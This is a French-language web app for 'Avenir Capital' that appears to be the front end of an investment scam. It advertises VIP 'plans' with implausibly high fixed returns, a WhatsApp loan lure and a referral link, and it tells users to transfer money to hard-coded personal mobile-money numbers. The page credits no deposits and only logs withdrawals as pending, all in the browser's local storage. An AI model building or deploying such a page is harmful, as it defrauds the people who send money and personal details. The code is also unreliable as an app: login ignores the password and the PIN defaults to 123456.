<!DOCTYPE html>
<html lang="fr" class="h-full">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title>Avenir Capital</title>
<style>
:root{--bg:#0a1a12;--card:#132e21;--tx:#f8fafc;--mu:#a3b8af;--pr:#10b981;--pr2:#059669;--bd:#1e4632;--wa:#10b981;--er:#ef4444;--gold:#f59e0b;--red:#dc2626;--jeko:#8b5cf6;box-sizing:border-box;padding-top:env(safe-area-inset-top,0px)}
@media(prefers-color-scheme:dark){:root:not([data-theme="light"]){--bg:#0a1a12;--card:#132e21;--tx:#f8fafc;--mu:#a3b8af;--pr:#10b981;--pr2:#059669;--bd:#1e4632}}
*{box-sizing:border-box}
body{margin:0;background:var(--bg);color:var(--tx);font:16px/1.4 system-ui,-apple-system,sans-serif;padding-bottom:calc(80px + env(safe-area-inset-bottom,0px));min-height:100vh;}
#app{max-width:480px;margin:auto;padding:16px;min-height:100vh;}
h1,h2,h3{margin:0 0 12px}h2{font-size:20px}
.card{background:var(--card);border:1px solid var(--bd);border-radius:14px;padding:14px;margin-bottom:12px}
.hero{background:linear-gradient(135deg,var(--red),var(--pr));color:#fff;border-radius:16px;padding:18px;margin-bottom:14px;box-shadow:0 4px 15px rgba(0,0,0,0.3);}
.hero small{opacity:.85;font-size:13px}.hero b{display:block;font-size:32px;margin-top:4px}
.banner-pret{background:linear-gradient(135deg, var(--gold) 0%, #d97706 100%);color:#fff;border-radius:16px;padding:18px;text-align:center;margin-bottom:14px;cursor:pointer;box-shadow:0 4px 12px rgba(245,158,11,0.25);text-decoration:none;display:block}
.banner-pret:active{transform:scale(0.98)}
input,select{width:100%;padding:12px;margin:6px 0 12px;border:1px solid var(--bd);border-radius:10px;background:var(--bg);color:var(--tx);font:inherit}
label{font-size:13px;color:var(--mu)}
button{font:inherit;cursor:pointer}
.btn{width:100%;padding:13px;border:0;border-radius:10px;background:var(--pr);color:#fff;font-weight:600;text-decoration:none;display:inline-block;text-align:center;transition:background 0.2s}
.btn:hover{background:var(--pr2)}
.btn.sec{background:rgba(16,185,129,0.15);color:var(--pr)}.btn.out{background:none;border:1px solid var(--er);color:var(--er)}
.btn.jeko{background:var(--jeko);color:#fff;display:block;text-align:center;text-decoration:none;margin-top:10px;padding:12px;border-radius:10px;font-weight:600}
.grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:14px}
.grid button{padding:16px 8px;border-radius:12px;border:1px solid var(--bd);background:var(--card);color:var(--tx);font-weight:600;display:flex;flex-direction:column;align-items:center;gap:6px}
.row{display:flex;justify-content:space-between;align-items:center;gap:8px;flex-wrap:wrap}
.li{display:flex;justify-content:space-between;align-items:center;width:100%;padding:14px;margin-bottom:8px;border:1px solid var(--bd);border-radius:12px;background:var(--card);color:var(--tx);text-align:left}
.tag{font-size:12px;padding:4px 10px;border-radius:20px;background:rgba(245, 158, 11, 0.2);color:var(--gold);font-weight:600}
.tag.pr{background:rgba(16, 185, 129, 0.2);color:var(--pr)}
.mu{color:var(--mu);font-size:14px}.err{color:var(--er);font-size:14px;min-height:20px;margin:4px 0 8px}
.chips{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:12px}.chips button{padding:8px 12px;border-radius:20px;border:1px solid var(--bd);background:var(--card);color:var(--tx)}
.back{background:none;border:0;color:var(--pr);padding:0 0 12px;font-weight:600;font-size:15px}
nav{position:fixed;left:0;right:0;bottom:0;display:flex;background:var(--card);border-top:1px solid var(--bd);padding-bottom:env(safe-area-inset-bottom,0px);z-index:100}
nav button{flex:1;padding:10px 2px;border:0;background:none;color:var(--mu);font-size:11px}nav button.on{color:var(--pr);font-weight:700}
nav span{display:block;font-size:20px;margin-bottom:2px}
.num{font-size:22px;font-weight:700;letter-spacing:1px;color:var(--gold)}
.vip-tag{font-size:11px;padding:3px 8px;border-radius:12px;background:rgba(16,185,129,0.2);color:var(--pr);font-weight:600}
.vip-icon{font-size:20px;margin-right:6px}

/* MODAL DE NOTIFICATION & BIENVENUE */
#modal-overlay {position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.75);display:none;align-items:center;justify-content:center;z-index:1000}
.modal-box{background:var(--card);border:1px solid var(--bd);border-radius:16px;padding:22px;width:90%;max-width:380px;text-align:center;box-shadow:0 10px 25px rgba(0,0,0,0.5)}
</style>
</head>
<body>
<div id="app"></div>
<nav id="nav"></nav>

<!-- BOÎTE DE DIALOGUE LOGICIEL -->
<div id="modal-overlay">
  <div class="modal-box">
    <h3 id="modal-title" style="color:var(--gold);margin-bottom:10px">Message</h3>
    <p id="modal-msg" class="mu" style="margin-bottom:18px;font-size:15px;line-height:1.5"></p>
    <button class="btn" onclick="closeModal()">Fermer</button>
  </div>
</div>

<script>
// CONFIGURATION & CONSTANTES
var WAVE_NUM = "0509302107";
var MOOV_NUM = "0104217547";
var MTN_NUM  = "0545576710";
var JEKO_LINK = "https://jeko.pay/avenir-capital"; 
var SUPPORT  = "https://wa.me/message/ABZ2BRFJPVIOE1";
var BONUS_PREMIUM = 350000;
var REG_LINK = "https://avenircapitalsocial22-droid.github.io/Avenir-capital-social-22/";

// 11 PLANS D'INVESTISSEMENT (VIP 1 À 9 + SACS DE LUXE)
var VIP = [
  {n:"VIP1 — Découverte", icon:"🟢", p:5000, jourRevenu:500, benefice:3500, total:8500, duree:7},
  {n:"VIP2 — Essentiel", icon:"🟡", p:10000, jourRevenu:1000, benefice:15000, total:25000, duree:15},
  {n:"VIP3 — Croissance", icon:"🔵", p:50000, jourRevenu:1130, benefice:22600, total:72600, duree:20},
  {n:"VIP4 — Premium", icon:"🟣", p:100000, jourRevenu:2000, benefice:60000, total:160000, duree:30},
  {n:"VIP5 — Excellence", icon:"🟠", p:200000, jourRevenu:3000, benefice:250000, total:450000, duree:45},
  {n:"VIP6 — Prestige", icon:"🟤", p:500000, jourRevenu:2250, benefice:135000, total:635000, duree:60},
  {n:"VIP7 — Élite", icon:"🔴", p:1000000, jourRevenu:5000, benefice:450000, total:1450000, duree:90},
  {n:"VIP8 — Mini", icon:"⚡", p:4000, jourRevenu:343, benefice:4116, total:8116, duree:12},
  {n:"VIP9 — Starter", icon:"🚀", p:3500, jourRevenu:250, benefice:5750, total:9250, duree:23},
  {n:"Sac Luxe Royal I", icon:"💎", p:2000000, jourRevenu:12000, benefice:880000, total:2880000, duree:74},
  {n:"Sac Luxe Diamant II", icon:"👑", p:5000000, jourRevenu:35000, benefice:2550000, total:7550000, duree:74}
];

var METH = ["Wave", "MTN Money", "Moov Money"];
var P = "signup";
var T = {};

function getStorage(key, def) {
  try {
    var item = localStorage.getItem(key);
    return item ? JSON.parse(item) : def;
  } catch(e) { return def; }
}

function setStorage(key, val) {
  try { localStorage.setItem(key, JSON.stringify(val)); } catch(e) {}
}

var currentUser = getStorage("ac_user", null);
var recs = getStorage("ac_recs", []);
var rets = getStorage("ac_rets", []);
var buys = getStorage("ac_buys", []);

function U() {
  return currentUser || { name: "Investisseur", phone: "", bal: 0, card: null, pin: "" };
}

function F(n) { return Number(n||0).toLocaleString("fr-FR") + " F"; }
function D() { return new Date().toLocaleDateString("fr-FR"); }
function esc(s) { return String(s||"").replace(/[&<>"]/g, function(c){ return {"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;"}[c]; }); }
function $(id) { var el = document.getElementById(id); return el ? el.value.trim() : ""; }

function showModal(title, msg){
  document.getElementById("modal-title").textContent = title;
  document.getElementById("modal-msg").textContent = msg;
  document.getElementById("modal-overlay").style.display = "flex";
}

window.closeModal = function(){
  document.getElementById("modal-overlay").style.display = "none";
};

function go(p, t){ P = p; if(t) Object.assign(T, t); render(); window.scrollTo(0,0); }
function err(m){ var e = document.getElementById("err"); if(e) e.textContent = m; }

function back(p){ return '<button class="back" onclick="go(\'' + (p||'home') + '\')">‹ Retour</button>'; }

function hist(a, empty){
  if(!a || !a.length) return '<p class="mu">' + empty + '</p>';
  return a.map(function(x){
    return '<div class="card row"><div><b>' + F(x.a) + '</b><div class="mu">' + x.m + ' · ' + x.t + '</div></div><span class="tag">' + (x.s||"En attente") + '</span></div>';
  }).join("");
}

window.copyN = function(num){
  try {
    navigator.clipboard.writeText(num);
    alert("✅ Copié dans le presse-papier !");
  } catch(e){ alert(num); }
};

var pages = {
signup: function(){
  return '<h1>Avenir Capital</h1><p class="mu">Créez votre compte investisseur.</p>' +
  '<div class="card">' +
    '<label>Nom complet</label><input id="n" placeholder="Ex: Jean Kouassi">' +
    '<label>Numéro de téléphone</label><input id="ph" type="tel" placeholder="Ex: 0708091011">' +
    '<label>Mot de passe</label><input id="pw" type="password" placeholder="••••••••">' +
    '<label>Lien d\'inscription officiel</label><input id="rf" value="' + REG_LINK + '" readonly style="opacity:0.7;font-size:12px">' +
    '<div id="err" class="err"></div>' +
    '<button class="btn" onclick="signup()">S\'inscrire</button>' +
  '</div>' +
  '<button class="btn sec" onclick="go(\'login\')">J\'ai déjà un compte</button>';
},

login: function(){
  return '<h1>Avenir Capital</h1>' +
  '<div class="card">' +
    '<label>Numéro de téléphone</label><input id="ph" type="tel" placeholder="Ex: 0708091011">' +
    '<label>Mot de passe</label><input id="pw" type="password" placeholder="••••••••">' +
    '<div id="err" class="err"></div>' +
    '<button class="btn" onclick="login()">Se connecter</button>' +
  '</div>' +
  '<button class="btn sec" onclick="go(\'signup\')">Créer un compte</button>';
},

home: function(){
  var u = U();
  return '<h2>Bonjour ' + esc(u.name) + ' 👋</h2>' +
  '<div class="hero">' +
    '<small>Solde disponible</small>' +
    '<b>' + F(u.bal) + '</b>' +
  '</div>' +
  '<a class="banner-pret" href="' + SUPPORT + '" target="_blank" rel="noopener">' +
    '<span style="font-size:28px">💰</span>' +
    '<h3 style="margin:6px 0 2px">Obtenir un Prêt Rapide</h3>' +
    '<p style="margin:0;opacity:0.9;font-size:13px">Jusqu\'à ' + F(BONUS_PREMIUM) + ' — Écrivez-nous sur WhatsApp</p>' +
  '</a>' +
  '<div class="grid">' +
    '<button onclick="go(\'recharge\')"><span>➕</span>Recharger</button>' +
    '<button onclick="go(\'withdraw\')"><span>💸</span>Retirer</button>' +
    '<button onclick="go(\'invest\')"><span>📈</span>Investir</button>' +
    '<button onclick="window.open(\'' + SUPPORT + '\',\'_blank\')"><span>🏦</span>Prêt</button>' +
  '</div>' +
  '<button class="li" onclick="go(\'histRec\')">📊 Historique des recharges <span>›</span></button>' +
  '<button class="li" onclick="go(\'histRet\')">📊 Historique des retraits <span>›</span></button>' +
  '<button class="li" onclick="go(\'service\')">💬 Service client WhatsApp <span>›</span></button>';
},

invest: function(){
  var items = VIP.map(function(v, i){
    var isLuxe = i >= 9;
    return '<div class="card" style="' + (isLuxe ? 'border:2px solid var(--gold);' : '') + '">' +
      '<div class="row"><b><span class="vip-icon">' + v.icon + '</span>' + v.n + '</b><span class="vip-tag">' + v.duree + ' jours</span></div>' +
      '<p class="mu" style="margin:8px 0">' +
        '💵 Capital : <b>' + F(v.p) + '</b><br>' +
        '📅 Durée : ' + v.duree + ' jours<br>' +
        '✅ Revenu/jour : ' + F(v.jourRevenu) + '<br>' +
        '🎯 Bénéfice total : +' + F(v.benefice) + '<br>' +
        '💰 Gain total estimé : <b>' + F(v.total) + '</b>' +
      '</p>' +
      '<button class="btn" onclick="buy(' + i + ')">Investir maintenant</button>' +
    '</div>';
  }).join("");
  return '<h2>📈 Plans d\'investissement (' + VIP.length + ' Sacs)</h2>' + items + '<div id="err" class="err"></div>';
},

achats: function(){
  if(!buys || !buys.length) return '<h2>Mes achats</h2><p class="mu">Aucun achat d\'investissement pour le moment.</p>';
  var list = buys.map(function(x){
    return '<div class="card">' +
      '<div class="row"><b>' + (x.icon||'📊') + ' ' + x.n + '</b><span class="tag pr">Actif</span></div>' +
      '<div class="mu" style="margin-top:6px">' +
        'Investi : ' + F(x.p) + ' · +' + F(x.jourRevenu) + '/jour · ' + x.duree + ' jours<br>' +
        'Bénéfice total : +' + F(x.benefice) + ' · Total : ' + F(x.total) + '<br>' +
        'Acheté le ' + x.t +
      '</div>' +
    '</div>';
  }).join("");
  return '<h2>Mes achats</h2>' + list;
},

team: function(){
  return '<h2>Mon équipe</h2><div class="card"><p class="mu">Lien d\'invitation officiel</p><input type="text" readonly value="' + REG_LINK + '" style="font-size:12px;text-align:center"><button class="btn sec" style="margin-top:8px" onclick="copyN(\'' + REG_LINK + '\')">Copier le lien d\'inscription</button></div>';
},

account: function(){
  var u = U();
  return '<h2>Mon compte</h2>' +
  '<div class="card"><b>' + esc(u.name) + '</b><div class="mu">' + esc(u.phone) + ' · Solde : ' + F(u.bal) + '</div></div>' +
  '<button class="li" onclick="go(\'histRec\')">Historique des recharges <span>›</span></button>' +
  '<button class="li" onclick="go(\'histRet\')">Historique des retraits <span>›</span></button>' +
  '<button class="li" onclick="go(\'achats\')">Mes achats <span>›</span></button>' +
  '<button class="li" onclick="go(\'team\')">Équipe <span>›</span></button>' +
  '<button class="li" onclick="go(\'link\')">Lier mon compte & Code PIN (6 chiffres) <span>›</span></button>' +
  '<button class="li" onclick="go(\'card\')">Ma carte bancaire <span>›</span></button>' +
  '<button class="li" onclick="go(\'service\')">Service client <span>›</span></button>' +
  '<button class="btn out" onclick="logout()">Se déconnecter</button>';
},

recharge: function(){
  return back() + '<h2>Recharger</h2>' +
  '<div class="card">' +
    '<label>Montant (minimum 1 000 F)</label>' +
    '<input id="a" type="number" inputmode="numeric" value="' + (T.amt||"") + '" placeholder="Ex: 10000">' +
    '<div class="chips">' +
      '<button onclick="document.getElementById(\'a\').value=4000">4 000</button>' +
      '<button onclick="document.getElementById(\'a\').value=5000">5 000</button>' +
      '<button onclick="document.getElementById(\'a\').value=10000">10 000</button>' +
      '<button onclick="document.getElementById(\'a\').value=50000">50 000</button>' +
    '</div>' +
    '<div id="err" class="err"></div>' +
    '<button class="btn" onclick="toMethod()">Continuer</button>' +
  '</div>';
},

method: function(){
  return back("recharge") + '<h2>Mode de paiement</h2>' +
  '<p class="mu">Montant à recharger : <b>' + F(T.amt) + '</b></p>' +
  '<button class="li wave" onclick="go(\'pay\', {m:\'Wave\', num:\'' + WAVE_NUM + '\'})"><b>Wave</b><span>›</span></button>' +
  '<button class="li" onclick="go(\'pay\', {m:\'MTN Money\', num:\'' + MTN_NUM + '\'})"><b>MTN Money</b><span>›</span></button>' +
  '<button class="li" onclick="go(\'pay\', {m:\'Moov Money\', num:\'' + MOOV_NUM + '\'})"><b>Moov Money</b><span>›</span></button>';
},

pay: function(){
  return back("method") + '<h2>Paiement par ' + T.m + '</h2>' +
  '<div class="card">' +
    '<p class="mu">Effectuez le transfert de <b>' + F(T.amt) + '</b> vers le numéro :</p>' +
    '<div class="card" style="background:var(--bg);text-align:center">' +
      '<div class="num">' + T.num + '</div>' +
      '<button class="btn sec btn-sm" style="width:auto;margin-top:10px;padding:8px 16px" onclick="copyN(\'' + T.num + '\')">Copier le numéro</button>' +
      '<a class="btn jeko" href="' + JEKO_LINK + '" target="_blank">🔗 Payer directement avec Jeko</a>' +
    '</div>' +
    '<label>Votre numéro d\'expéditeur</label><input id="pn" type="tel" placeholder="Ex: 0708091011">' +
    '<label>ID de transaction</label><input id="tx" placeholder="Ex: Tx12345678">' +
    '<div id="err" class="err"></div>' +
    '<button class="btn" onclick="confirmPay()">Confirmer le paiement</button>' +
  '</div>';
},

withdraw: function(){
  var c = U().card;
  return back() + '<h2>Retirer des fonds</h2>' +
  '<div class="card">' +
    '<p class="mu">Solde disponible : <b style="color:var(--pr)">' + F(U().bal) + '</b></p>' +
    '<label>Montant (minimum 1 000 F)</label><input id="a" type="number" inputmode="numeric" placeholder="Ex: 5000">' +
    '<label>Votre numéro de réception</label><input id="pn" type="tel" value="' + (c ? esc(c.num) : "") + '" placeholder="Ex: 0708091011">' +
    '<label>Code PIN de retrait (6 chiffres)</label><input id="pin" type="password" maxlength="6" placeholder="••••••">' +
    '<div id="err" class="err"></div>' +
    '<button class="btn" onclick="doWd()">Valider le retrait</button>' +
  '</div>';
},

histRec: function(){ return back() + '<h2>Historique des recharges</h2>' + hist(recs, "Aucune recharge enregistrée."); },
histRet: function(){ return back() + '<h2>Historique des retraits</h2>' + hist(rets, "Aucun retrait enregistré."); },

link: function(){
  var u = U();
  var opts = METH.map(function(m){
    return '<option ' + (u.card && u.card.m === m ? 'selected' : '') + '>' + m + '</option>';
  }).join("");
  
  return back("account") + '<h2>Lier un compte & Code PIN</h2>' +
  '<div class="card">' +
    '<label>Méthode de réception</label><select id="m">' + opts + '</select>' +
    '<label>Numéro de téléphone</label><input id="pn" type="tel" value="' + (u.card ? esc(u.card.num) : '') + '" placeholder="Ex: 0708091011">' +
    '<label>Code PIN de retrait (6 chiffres)</label><input id="pin" type="password" maxlength="6" value="' + (u.pin || '') + '" placeholder="Ex: 123456">' +
    '<div id="err" class="err"></div>' +
    '<button class="btn" onclick="doLink()">Enregistrer</button>' +
  '</div>';
},

card: function(){
  var c = U().card;
  return back("account") + '<h2>Ma carte de retrait</h2>' +
  (c ? '<div class="hero"><small>' + esc(c.m) + '</small><b>' + esc(c.num) + '</b><small>' + esc(U().name) + '</small></div>' : '<p class="mu">Aucun compte lié.</p><button class="btn" onclick="go(\'link\')">Lier un compte</button>');
},

service: function(){
  return back("account") + '<h2>Service client WhatsApp</h2>' +
  '<div class="card"><p class="mu">Contactez-nous sur WhatsApp pour vos dépôts, retraits ou prêts.</p><a class="btn" href="' + SUPPORT + '" target="_blank" rel="noopener">💬 Contact WhatsApp</a></div>';
}
};

function render(){
  var app = document.getElementById("app"), n = document.getElementById("nav");
  if(!currentUser && P !== "login") P = "signup";
  if(currentUser && (P === "signup" || P === "login")) P = "home";

  if(app && pages[P]) app.innerHTML = pages[P]();

  if(n){
    if(P === "signup" || P === "login"){
      n.style.display = "none";
    } else {
      n.style.display = "flex";
      var tabs = [["home","🏠","Accueil"],["invest","📈","Investir"],["achats","🧾","Sacs"],["team","👥","Équipe"],["account","👤","Compte"]];
      n.innerHTML = tabs.map(function(t){
        return '<button class="' + (t[0]===P?'on':'') + '" onclick="go(\'' + t[0] + '\')"><span>' + t[1] + '</span>' + t[2] + '</button>';
      }).join("");
    }
  }
}

function signup(){
  var n = $("n"), p = $("ph"), w = $("pw");
  if(!n || p.length < 8 || w.length < 6) return err("Veuillez remplir tous les champs (Mot de passe min. 6 car.).");
  
  currentUser = { name: n, phone: p, bal: 0, card: null, pin: "123456" };
  setStorage("ac_user", currentUser);
  
  showModal("🎉 Soyez le bienvenu sur Avenir Capital !", "Votre compte a été créé avec succès. Profitez dès maintenant de nos opportunités d'investissement.");
  go("home");
}

function login(){
  var p = $("ph"), w = $("pw");
  if(!p || p.length < 8) return err("Entrez votre numéro et votre mot de passe.");
  
  currentUser = getStorage("ac_user", { name: "Investisseur", phone: p, bal: 0, card: null, pin: "123456" });
  currentUser.phone = p;
  setStorage("ac_user", currentUser);
  
  showModal("👋 Heureux de vous revoir !", "Soyez le bienvenu sur Avenir Capital, " + currentUser.name + " !");
  go("home");
}

function logout(){
  currentUser = null;
  try { localStorage.removeItem("ac_user"); } catch(e){}
  go("signup");
}

function buy(i){
  var v = VIP[i];
  if(currentUser.bal < v.p) return err("Solde insuffisant pour ce sac.");
  
  currentUser.bal -= v.p;
  setStorage("ac_user", currentUser);
  
  buys.push({ n: v.n, icon: v.icon, p: v.p, jourRevenu: v.jourRevenu, benefice: v.benefice, total: v.total, duree: v.duree, t: D() });
  setStorage("ac_buys", buys);
  go("achats");
}

function toMethod(){
  var a = +$("a");
  if(a < 1000) return err("Montant minimum : 1 000 F.");
  T.amt = a;
  go("method");
}

function confirmPay(){
  var p = $("pn"), t = $("tx");
  if(p.length < 8 || t.length < 3) return err("Renseignez votre numéro et l'ID de transaction.");
  
  recs.push({ a: T.amt, m: T.m + " · " + esc(p) + " · ID: " + esc(t), t: D(), s: "En attente" });
  setStorage("ac_recs", recs);
  go("histRec");
}

function doWd(){
  var a = +$("a"), p = $("pn"), pin = $("pin");
  if(a < 1000) return err("Montant minimum : 1 000 F.");
  if(p.length < 8) return err("Entrez un numéro valide.");
  if(!pin || pin.length !== 6) return err("Code PIN à 6 chiffres obligatoire.");
  if(currentUser.pin && pin !== currentUser.pin) return err("Code PIN incorrect.");
  if(currentUser.bal < a) return err("Solde insuffisant.");

  currentUser.bal -= a;
  setStorage("ac_user", currentUser);
  
  rets.push({ a: a, m: esc(p), t: D(), s: "En attente" });
  setStorage("ac_rets", rets);
  
  showModal("💸 Soyez le bienvenu sur Avenir Capital !", "Votre demande de retrait de " + F(a) + " a été soumise avec succès et sera traitée rapidement.");
  go("histRet");
}

function doLink(){
  var p = $("pn"), pin = $("pin");
  if(p.length < 8) return err("Numéro invalide.");
  if(!pin || pin.length !== 6) return err("Le code PIN doit comporter 6 chiffres.");
  
  currentUser.card = { m: $("m"), num: p };
  currentUser.pin = pin;
  setStorage("ac_user", currentUser);
  
  alert("✅ Portefeuille et code PIN enregistrés avec succès !");
  go("card");
}

window.signup = signup;
window.login = login;
window.logout = logout;
window.buy = buy;
window.toMethod = toMethod;
window.confirmPay = confirmPay;
window.doWd = doWd;
window.doLink = doLink;
window.go = go;

// Exécution du rendu au démarrage
render();
</script>
